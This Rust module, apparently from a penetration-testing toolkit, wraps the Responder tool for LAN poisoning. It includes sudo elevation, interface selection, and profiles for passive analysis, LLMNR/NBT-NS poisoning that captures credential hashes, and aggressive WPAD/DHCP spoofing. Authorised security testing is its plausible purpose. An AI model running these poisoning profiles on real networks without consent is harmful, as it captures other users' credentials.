use std::fs;
use std::path::Path;
use chrono::Local;
use colored::*;
use crate::history::{append_history, HistoryEntry};
use crate::executor::CommandExecutor;
use crate::io_handler::IoHandler;

#[derive(Debug, Clone)]
pub struct PoisonProfile {
    pub name: String,
    pub description: String,
    pub flags: Vec<&'static str>,
}

impl PoisonProfile {
    pub fn new(name: &str, description: &str, flags: &[&'static str]) -> Self {
        Self {
            name: name.to_string(),
            description: description.to_string(),
            flags: flags.to_vec(),
        }
    }
}

pub fn run_poisoning(interface_input: &str, _use_proxy: bool, executor: &dyn CommandExecutor, io: &dyn IoHandler) {
    // 1. Check Root & Prompt for Sudo
    let mut use_sudo = false;
    if !executor.is_root() {
        io.print(&format!("\n{} {} [Y/n]: ", "[!]".red(), "LAN Poisoning requires ROOT privileges. Attempt to elevate with sudo?".yellow().bold()));
        io.flush();
        let input = io.read_line();
        
        if input.trim().eq_ignore_ascii_case("y") || input.trim().is_empty() {
             use_sudo = true;
             let status = executor.execute("sudo", &["-v"]);
            
             if status.is_err() || !status.unwrap().success() {
                 io.println(&format!("{}", "[-] Sudo authentication failed. Aborting.".red()));
                 return;
             }
        } else {
             io.println(&format!("{}", "[-] Root required. Exiting.".red()));
             return;
        }
    }

    // 2. Check Dependency
    if executor.execute_output("responder", &["--help"]).is_err() {
        io.println(&format!("{}", "[-] 'responder' not found. Please install it (sudo pacman -S responder).".red()));
        return;
    }

    // 3. Select Interface (if not provided or empty)
    let interface = if interface_input.is_empty() {
        select_interface(executor, io)
    } else {
        interface_input.to_string()
    };

    if interface.is_empty() {
        io.println(&format!("{}", "[!] No interface selected.".red()));
        return;
    }

    // 4. Define Profiles
    let profiles = vec![
        PoisonProfile::new(
            "Analyze Mode",
            "Passive. Listen for requests, do NOT poison. (Safe)",
            &["-A"]
        ),
        PoisonProfile::new(
            "Basic Poisoning",
            "Respond to LLMNR/NBT-NS queries. Capture hashes.",
            &["-w", "-r", "-f"]
        ),
        PoisonProfile::new(
            "Aggressive",
            "Force WPAD authentication + DHCP (Risky).",
            &["-w", "-r", "-f", "--wpad", "--dhcp-wpad"] // Careful with DHCP
        ),
    ];

    // 5. Select Profile
    io.println(&format!("\n{}", "Select Poisoning Profile:".blue().bold()));
    for (i, p) in profiles.iter().enumerate() {
        io.println(&format!("[{}] {} - {}", i + 1, p.name.green(), p.description));
    }

    io.print(&format!("\nChoose a profile [1-{}]: ", profiles.len()));
    io.flush();
    let input = io.read_line();

    let profile = if let Ok(idx) = input.trim().parse::<usize>() {
        if idx > 0 && idx <= profiles.len() {
            profiles[idx - 1].clone()
        } else {
            profiles[0].clone()
        }
    } else {
        profiles[0].clone()
    };

    // 6. Setup Output
    // Responder is noisy. We'll run it interactively but maybe try to move logs after.
    // Responder logs usually go to /usr/share/responder/logs/ or local logs/
    // We will assume interactive run for now as it's a TUI tool.
    
    let date = Local::now().format("%Y%m%d_%H%M%S").to_string();
    let output_dir = format!("scans/poison/{}", date);
    fs::create_dir_all(&output_dir).expect("Failed to create output dir");

    io.println(&format!("{}", format!("\n[+] Starting Responder on {}", interface).green()));
    io.println(&format!("{}", format!("[+] Profile: {}", profile.name).cyan()));
    io.println(&format!("{}", "[!] Press Ctrl+C to stop.".yellow()));

    // 7. Execute
    let (responder_cmd, responder_args) = build_responder_command("responder", &interface, &profile.flags, use_sudo);
    let responder_args_str: Vec<&str> = responder_args.iter().map(|s| s.as_str()).collect();

    // We use sudo implicitly because we checked root, but if we are not root (e.g. strict confinement), we fail.
    // But we checked geteuid 0.

    let status = executor.execute(&responder_cmd, &responder_args_str);

    // 8. Post-Run Cleanup / Log Retrieval
    // Try to find logs and move them?
    // Common path: /usr/share/responder/logs/
    // or ./logs/
    
    // Check local logs first
    if Path::new("logs").exists() {
         let _ = fs::rename("logs", Path::new(&output_dir).join("logs"));
         io.println(&format!("{}", format!("[+] Logs moved to {}", output_dir).green()));
    }

    match status {
        Ok(_) => {
             let _ = append_history(&HistoryEntry::new("Poisoning", &interface, "Executed"));
        },
        Err(e) => io.println(&format!("{} {}", "[!] Failed to start process:".red(), e)),
    }
}

pub fn build_responder_command(
    base_cmd: &str,
    interface: &str,
    flags: &[&str],
    use_sudo: bool
) -> (String, Vec<String>) {
    let mut args = vec!["-I".to_string(), interface.to_string()];
    args.extend(flags.iter().map(|s| s.to_string()));
    
    let mut final_cmd = base_cmd.to_string();
    if use_sudo {
        args.insert(0, final_cmd);
        final_cmd = "sudo".to_string();
    }

    (final_cmd, args)
}

fn select_interface(executor: &dyn CommandExecutor, io: &dyn IoHandler) -> String {
    // List interfaces using 'ip link'
    let output = executor.execute_output("ip", &["link"]);
    if let Ok(out) = output {
        let out_str = String::from_utf8_lossy(&out.stdout);
        let mut ifaces = Vec::new();
        
        for line in out_str.lines() {
            if let Some(start) = line.find(": ") {
                if let Some(end) = line[start+2..].find(':') {
                    let iface = &line[start+2..start+2+end];
                    if iface != "lo" {
                        ifaces.push(iface.trim().to_string());
                    }
                }
            }
        }

        if ifaces.is_empty() {
            return "eth0".to_string(); // Fallback
        }

        io.println(&format!("\n{}", "Available Interfaces:".blue()));
        for (i, iface) in ifaces.iter().enumerate() {
            io.println(&format!("[{}] {}", i + 1, iface));
        }

        io.print(&format!("\nSelect Interface [1-{}]: ", ifaces.len()));
        io.flush();
        let input = io.read_line();

        if let Ok(idx) = input.trim().parse::<usize>() {
            if idx > 0 && idx <= ifaces.len() {
                return ifaces[idx - 1].clone();
            }
        }
        ifaces[0].clone()
    } else {
        "eth0".to_string()
    }
}

#[cfg(test)]
#[path = "poison_tests.rs"]
mod tests;
